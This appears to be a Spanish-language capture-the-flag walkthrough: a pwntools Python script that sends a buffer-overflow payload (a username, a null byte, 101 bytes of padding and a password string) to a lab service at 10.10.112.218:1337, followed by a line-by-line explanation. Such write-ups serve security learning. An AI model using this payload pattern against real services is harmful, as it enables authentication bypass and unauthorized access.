
ejemplo de script en python

from pwn import *

conn = remote('10.10.112.218', 1337)
payload = b"bytereaper\x00" + b"A" * 101 + b"5up3rP4zz123Byte"
conn.recvuntil(b"Username:")
conn.sendline(payload)
print(conn.recvall().decode())

NOTA: El prefijo b" (como en b"bytereaper") indica que estás trabajando con una cadena de bytes, no una cadena de texto normal (string).

**Explicacion de script:**
Establece una conexión TCP/IP con un servidor remoto:
conn = remote('10.10.112.218', 1337)
IP: 10.10.112.218
Puerto: 1337

Aquí se construye el payload, es decir, los datos que se van a enviar al servidor.
payload = b"bytereaper\x00" + b"A" * 101 + b"5up3rP4zz123Byte"

b"bytereaper\x00"
→ Se envía el string "bytereaper" seguido de un byte nulo (\x00). Esto sugiere que el servidor podría estar usando este valor como nombre de usuario o identificador, y el \x00 puede usarse para terminar una cadena si el programa está escrito en C (donde \x00 indica fin de cadena).

b"A" * 101
→ Se agregan 101 letras "A". Esto probablemente es relleno (padding), posiblemente para llegar a una posición específica en memoria o para sobrescribir algo importante como un buffer.

b"5up3rP4zz123Byte"
→ Se envía este string como si fuera una contraseña o clave secreta que se espera al final del buffer. Podría ser la contraseña válida o parte de un exploit para sobrescribir una variable crítica.

conn.recvuntil(b"Username:")

Este comando espera hasta que el servidor envíe el texto "Username:" (lo que implica que el servicio solicita un nombre de usuario). Esto asegura que el script no envíe nada antes de que el servidor esté listo para recibirlo.

conn.sendline(payload)

Envía el payload al servidor, como una línea (es decir, con \n al final). Esto simula que el usuario introduce el nombre de usuario (y posiblemente la contraseña) en una sola línea.

print(conn.recvall().decode())

Recibe todo el output restante del servidor (hasta que la conexión se cierre), lo decodifica (de bytes a string) y lo imprime.
Esto muestra la respuesta del servidor después de enviar el payload.